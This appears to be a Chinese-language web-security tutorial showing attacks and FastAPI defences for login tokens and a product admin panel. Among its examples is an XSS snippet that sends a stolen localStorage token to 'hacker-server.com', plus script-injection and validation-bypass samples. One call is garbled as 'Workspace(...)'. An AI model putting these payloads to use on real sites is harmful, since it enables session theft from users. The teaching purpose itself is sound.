## 你的網站，其實正對駭客裸奔？從三大功能看懂攻防實戰

### ✍️ 前言

你寫了一個登入頁，一個商品後台，一個查圖片的功能，感覺都沒什麼問題。
但你打開 F12，駭客也打開了；你按下登入，他也跟著打了 API。
你甚至還沒發現你用的圖床爆流量、API 被打爆、帳號被盜光。

這篇文章不講抽象名詞，我們用一場場攻防演練，從你會做的 3 個操作出發：
**登入、上傳商品、查圖片。**
看看駭客如何見招拆招，而你又該如何防守。全篇包含攻防故事、F12 圖解、精簡 JS + Python (FastAPI) 程式碼、與每層防守實作建議。
看完這篇，即使你不是資安專家，也能寫出更難被攻破的網站！

-----

### 1️⃣ 登入攻防戰：Token 的生死鬥

**本章你將學會：**

  * 為何 GET 傳輸帳密是災難，以及如何安全傳輸。
  * Token 存哪裡最危險？XSS 如何竊取 Token？
  * HttpOnly Cookie 如何成為 Token 的避風港。
  * 為何登出後 Token 依然可能有效，以及如何真正讓它失效。
  * 比較 LocalStorage、SessionStorage、Cookie 的安全性。

-----

#### 回合一：帳密裸奔的風險

**漏洞：用 GET 請求傳送帳密**

你可能為了方便，在前端這樣寫：

```js
// ❌ 用 GET 傳帳密
fetch("https://example.com/login?username=alice&password=123456")
  .then((res) => res.json())
  .then(console.log);
``` 

後端 FastAPI 可能這樣接收：


```python
@app.get("/login")
def login(username: str, password: str):
    if username == "alice" and password == "123456":
        return {"token": "my-secret-token"}
    return {"error": "Invalid credentials"}
```
你拿到 token 後打算這樣用：

```js
localStorage.setItem("token", "my-secret-token"); // ❌
```

看似簡單，卻留下超多破口。
**駭客攻擊：F12 一覽無遺**

1.  **瀏覽器歷史紀錄、伺服器日誌**：帳密直接暴露。
2.  **F12 Network Panel**：駭客打開 F12 -\> Network，就能在請求的 URL 中看到明文帳密。

**你的防守：改用 POST + HTTPS**

  * **帳密放 Body**：POST 請求將數據放在請求主體中。
  * **HTTPS 加密**：確保傳輸過程被加密，即使被攔截也無法輕易讀取。
 
```javascript
// 前端 login.js (改進)
fetch("https://example.com/login", { // 假設已是 HTTPS
    method: "POST", // ✅ 改用 POST
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "alice", password: "123456" }),
}) 
```

```python 
class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/login") # ✅ 改用 POST
async def login_post(user: LoginRequest):
    # 實際應用中:
    # 1. 從資料庫查詢 user.username
    # 2. 驗證 user.password (雜湊比對)
    if user.username == "alice" and user.password == "123456":
        # 實際應用中: 產生 JWT Token
        return {"token": "my-secret-token-from-post"}
    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="帳號或密碼錯誤")
```

*提醒：生產環境務必全程 HTTPS。*

-----

#### 回合二：無處安放的 Token

你拿到了 Token，開心地存在 `localStorage`：

```javascript
// (續上)
localStorage.setItem("token", "my-secret-token-from-post"); // ❌ 風險儲存
```

**駭客攻擊：XSS 輕鬆竊取 localStorage 中的 Token**

如果你的網站有任何一處存在 XSS (跨站腳本攻擊) 漏洞，例如某個留言板未過濾用戶輸入：

```html
<div>使用者留言： <img src="x" onerror="alert('XSS! Token is: ' + localStorage.getItem('token'))"></div>
```

或者更隱蔽地將 Token 送到駭客伺服器：

```html
<script>
  var stolenToken = localStorage.getItem('token');
  if (stolenToken) { new Image().src = 'https://hacker-server.com/steal?token=' + stolenToken; }
</script>
```

駭客在 F12 Console 也能直接執行 `localStorage.getItem('token')` 拿走它。

**你的防守：改用 HttpOnly Cookie**

`HttpOnly` Cookie 無法被 JavaScript 讀取，能有效抵禦 XSS 竊取 Token。

後端（FastAPI）：

```python
@app.post("/login")
def login(data: LoginRequest, response: Response):
    token = create_jwt_token(data.username)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True, # ✅ JavaScript 無法讀取
        samesite="Strict", # ✅ 防禦 CSRF
        secure=True,  # ✅ 僅在 HTTPS 下傳輸 (開發時若無 HTTPS 可先 False)
        max_age=3600,  # cookie 有效期
    )
    return {"msg": "登入成功"}
```

前端後續請求只要：

```js
fetch("/api/get_info", {
  method: "GET",
  credentials: "include",
});
```

前端現在不需要手動儲存 Token，瀏覽器會在後續請求中自動帶上 Cookie。

-----

#### 回合三：每個 API 都要驗證身份
 
雖然確認了前端請求會帶token，但也要確認後端都有驗證token

後端需針對每筆 request 驗證身份：

```python
from fastapi import Request, HTTPException, Depends

def get_current_user(request: Request):
    token = request.cookies.get("access_token")
    if not token:
        raise HTTPException(status_code=401)
    return decode_jwt(token)
```

應用：

```python
@app.get("/me")
def get_profile(user=Depends(get_current_user)):
    return {"username": user.username}
``` 

-----

#### 小結與 Token 儲存方式比較

經過幾輪攻防，我們知道 HttpOnly Cookie 是 Web 環境下儲存 Token 的較優選擇。現在，讓我們正式比較一下各種儲存方式：

| 特性         | localStorage                                  | sessionStorage                               | Cookie (HttpOnly)                                              |
| :----------- | :-------------------------------------------- | :------------------------------------------- | :------------------------------------------------------------- |
| **生命週期** | 永久，除非手動或程式清除                      | 分頁/瀏覽器關閉後清除                        | 可設定過期時間 (`Max-Age`)                                      |
| **JS 存取** | 可 (`localStorage.getItem/setItem`)           | 可 (`sessionStorage.getItem/setItem`)        | **不可** (若設定 HttpOnly)                                   |
| **XSS 風險** | **高** (Token 易被竊取)                       | **高** (Token 易被竊取)                       | **低** (Token 不易被 JS 竊取，但 XSS 仍可以發起請求)          |
| **CSRF 風險**| 低 (需 JS 主動發請求，預設不帶)               | 低 (同上)                                    | **中** (需配合 `SameSite` 屬性防禦)                         |
| **與伺服器通訊** | 不自動傳送，需手動加入請求 (如 Header)      | 不自動傳送，需手動加入請求                   | 自動隨同網域請求傳送 (可控制 Path, Domain)                     |
| **容量** | 約 5-10MB                                     | 約 5-10MB                                    | 約 4KB (較小)                                                  |
| **推薦場景** | 非敏感的用戶偏好設定                          | 表單暫存資料，分頁級別狀態                   | **Session 管理、Token 儲存** (配合 `Secure`, `SameSite`)      |

-----

## 2️⃣ 商品後台的保衛戰：攻破你的 CRUD

**情境:** 你設計了一個後台表單，讓使用者登入後可以新增商品。表單有商品名稱、描述、價格、圖片等欄位。當使用者填完表單按下送出，前端會發出一個 `POST` 請求到後端 API，存進資料庫。


**本章你將學會：**

  * 為何前端驗證不可靠，以及後端驗證的重要性。
  * 隱藏功能按鈕為何擋不住駭客。
  * 商品說明中的 XSS 攻擊與防禦。 

-----

#### 回合一：新增商品的前端驗證

你在前端寫了完美的商品價格驗證：

```javascript
// 前端 product_form.js (壞範例 - 僅前端驗證)
function createProduct() {
    const price = parseFloat(document.getElementById('productPrice').value);
    if (isNaN(price) || price <= 0) {
        alert('價格必須是正數！'); // ❌ 僅前端驗證
        return;
    }
    // fetch('/api/products', { method: 'POST', body: JSON.stringify({price: price, ...}) ... });
    console.log("前端驗證通過，價格:", price);
}
```

**駭客攻擊：F12 Console / Postman 輕鬆繞過**

駭客根本不鳥你的 UI，直接打開 F12 Console：

```javascript
// 駭客在 Console 中執行
fetch('/api/products', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', /* 'Authorization': 'Bearer ...' */ },
    body: JSON.stringify({ productName: '惡意商品', productPrice: -999 }) // 😈 負數價格
})
.then(res => res.json()).then(console.log);
```

如果後端沒有驗證，一個價格為負的商品就成功建立了！

**你的防守：後端才是真正的守門員**

**黃金法則：永遠不要相信任何來自客戶端的數據！**

```python
# 後端 main.py (商品API - 加入後端驗證)
from pydantic import BaseModel, Field

class ProductCreate(BaseModel):
    productName: str = Field(..., min_length=1)
    productPrice: float = Field(..., gt=0) # ✅ 價格必須大於 0
    # ... 其他欄位與驗證規則

@app.post("/api/products")
async def create_new_product(product: ProductCreate, current_user: dict = Depends(get_current_user_from_token)):
    # 也可以在這裡做數值檢查，而不是透過 Pydantic
    if product.productPrice <= 0:
        raise HTTPException(status_code=400, detail="價格必須大於 0")
     
    # 實際儲存到資料庫...
    db.save(product)

    return {"message": "商品建立成功", "product_data": product.model_dump()}
```

FastAPI 結合 Pydantic 模型可以輕鬆實現強大的後端資料驗證。

-----

#### 回合二：隱藏也沒用的管理員按鈕

你把「刪除所有商品」的按鈕用 CSS `display: none;` 藏起來，只給管理員看。

```html
<script> /* if (isAdmin) document.getElementById('deleteAllBtn').style.display = 'block'; */ </script>
```

**駭客攻擊：F12 一秒現形，直接呼叫 API**

1.  **改 DOM**：駭客在 F12 Elements 面板移除 `style="display: none;"`。
2.  **讀 JS**：找到 `deleteAll()` 函數或對應的 API 端點 `/api/admin/delete-everything`。
3.  **直接執行**：在 Console 執行 `deleteAll()` 或 `Workspace('/api/admin/delete-everything', {method: 'POST'})`。

**你的防守：後端權限檢查 (Authorization)**

UI 隱藏只是障眼法，真正的安全來自後端對每個操作的權限驗證。

```python
# 後端 main.py (加入權限檢查裝飾器/依賴)
async def get_admin_user(current_user: dict = Depends(get_current_user_from_token)):
    # 假設 token payload 中有 roles 資訊，或從資料庫查詢用戶角色
    # if "admin" not in get_user_roles(current_user['user_id']):
    if current_user['username'] != "admin": # 簡化：假設只有名為 admin 的用戶是管理員
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="沒有權限執行此操作")
    return current_user

@app.post("/api/admin/delete-everything")
async def delete_everything(admin_user: dict = Depends(get_admin_user)): # ✅ 依賴注入，自動做權限檢查
    print(f"ADMIN User {admin_user['username']} is DELETING ALL PRODUCTS!")
    # EXTREMELY_DANGEROUS_OPERATION_HERE()
    return {"message": "所有商品已刪除 (模擬操作)"}
```

-----

#### 回合三：商品說明裡的 XSS 陷阱

你的商品說明欄位允許用戶輸入豐富的 HTML。

**駭客攻擊：注入 `<script>` 導致 Stored XSS**

駭客在商品說明中填入：
`這是一件很棒的商品！<script>alert('XSS from product! Your session might be hijacked!')</script>`
當其他用戶瀏覽此商品時，惡意腳本就會在他們的瀏覽器執行。

**你的防守：輸入清理與輸出編碼**

1.  **輸入清理 (Input Sanitization)**：後端儲存前，移除或轉義惡意 HTML 標籤和屬性。使用如 `bleach` 函式庫。
2.  **輸出編碼 (Output Encoding)**：顯示內容時，對 HTML 特殊字元進行編碼。現代模板引擎 (如 Jinja2) 預設會做。
 

```python
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import bleach

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# ✅ 定義允許的 HTML 標籤
ALLOWED_TAGS = ["b", "i", "u", "strong", "em", "ul", "ol", "li", "p", "br"]

# ✅ 假設商品資料庫，實際應為資料庫資料
raw_products = {
    "1": {"name": "安全商品", "description": "<strong>無害的描述</strong>"},
    "2": {"name": "XSS商品", "description": "危險! <script>alert('XSS!')</script>"}
}

def sanitize_html(text: str) -> str:
    return bleach.clean(text, tags=ALLOWED_TAGS, strip=True)

@app.get("/products/{product_id}", response_class=HTMLResponse)
async def read_product(request: Request, product_id: str):
    product = raw_products.get(product_id)

    # ✅ 清洗商品說明欄位
    if product:
        product = product.copy()  # 不修改原資料
        product["description"] = sanitize_html(product["description"])

    return templates.TemplateResponse(
        "product_detail.html",
        {"request": request, "product": product}
    )

```
 

-----
 